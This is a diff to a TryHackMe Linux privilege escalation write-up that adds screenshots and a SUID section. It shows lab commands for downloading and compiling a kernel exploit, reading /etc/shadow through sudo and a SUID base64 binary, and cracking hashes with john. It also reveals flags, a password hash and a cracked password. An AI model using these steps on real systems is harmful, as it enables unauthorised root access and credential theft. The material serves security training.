@@ -51,11 +51,11 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    We first need to find the kernel version on this system with `uname -a`.
 
-   KERNEL VERSION
+   ![Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Kernel_Version.png)
 
    Then we can look for an exploit for this kernel through Exploit Database for example.
 
-   KERNEL EXPLOIT
+   ![Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Kernel_Exploit.png)
 
    Now we can either download the file from here or locate it on our machine through the file name. 
 
@@ -79,7 +79,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    wget 10.18.78.136:8080/exploit.c
    ```
 
-   KERNEL PREPARE
+   ![Prepare](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Kernel_Prepare.png)
    
    Now we should compile the file.
 
@@ -87,7 +87,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    gcc exploit.c -o exploit
    ```
 
-   KERNEL SUCCESS
+   ![Success](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Kernel_Success.png)
 
    Lastly, we need to search for the flag and read it!
    
@@ -97,7 +97,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    cat /home/matt/flag1.txt
    ```
 
-   KERNEL FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Kernel_Flag.png)
    
    ><details><summary>Click for answer</summary>THM-28392872729920</details>
    
@@ -107,7 +107,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    We can find that out with: `sudo -l`.
 
-   SUDO PERMISSIONS
+   ![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Sudo_Permissions.png)
 
    ><details><summary>Click for answer</summary>3</details>
 
@@ -119,7 +119,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    find / -name flag2.txt 2>/dev/null
    ```
 
-   SUDO LOCATION
+   ![Location](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Sudo_Location.png)
 
    To read the flag we can use either `less` or `nano`.
 
@@ -129,7 +129,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    sudo nano /home/ubuntu/flag2.txt
    ```
 
-   SUDO FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Sudo_Flag.png)
 
    P.s. It turned out permission weren't even needed to read the flag..
 
@@ -149,12 +149,74 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    sudo nano /etc/shadow
    ```
 
-   SUDO HASHES
+   ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Sudo_Hashes.png)
 
    ><details><summary>Click for answer</summary>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</details>
    
 
 ### Privilege Escalation: SUID
+
+1. Which user shares the name of a great comic book writer?
+
+   This we can find in the passwd file. This can be opened without any permissions. So we can use any means we want.
+
+   ![Writer](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Suid_Writer.png)
+
+   Copy to contents to a file.
+
+   ><details><summary>Click for answer</summary>gerryconway</details>
+
+3. What is the password of user2?
+
+   First we need to find which binary with a set SUID bit we can use.
+
+   ```cmd
+   find / -type f -perm -4000 2>/dev/null
+   ```
+
+   ![Bin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Suid_Bin.png)
+
+   Looks like we can use base64. Let's us it to copy the contents of the shadow file.
+
+   ```cmd
+   /usr/bin/base64 "/etc/shadow" | base64 --decode
+   ```
+
+   ![Shadow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Suid_Shadow.png)
+
+   Now we join these two files with `unshadow`.
+
+   ```cmd
+   unshadow passwd.txt shadow.txt > passwords.txt
+   ```
+
+   Finally, we use john to crack the password.
+
+   ```cmd
+   john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+   ```
+
+   ![Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Suid_Passwords.png)
+
+   ><details><summary>Click for answer</summary>Password1</details>
+
+5. What is the content of the flag3.txt file?
+
+   We can use the same method as before, but with a different file. Searching for the flag gives us its location.
+
+   ```cmd
+   find / -name flag3.txt 2>/dev/null
+   /home/ubuntu/flag3.txt
+   ```
+
+   ```cmd
+   /usr/bin/base64 "/home/ubuntu/flag3.txt" | base64 --decode
+   ```
+
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Suid_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM-3847834</details>
+
 ### Privilege Escalation: Capabilities
 ### Privilege Escalation: Cron Jobs
 ### Privilege Escalation: PATH
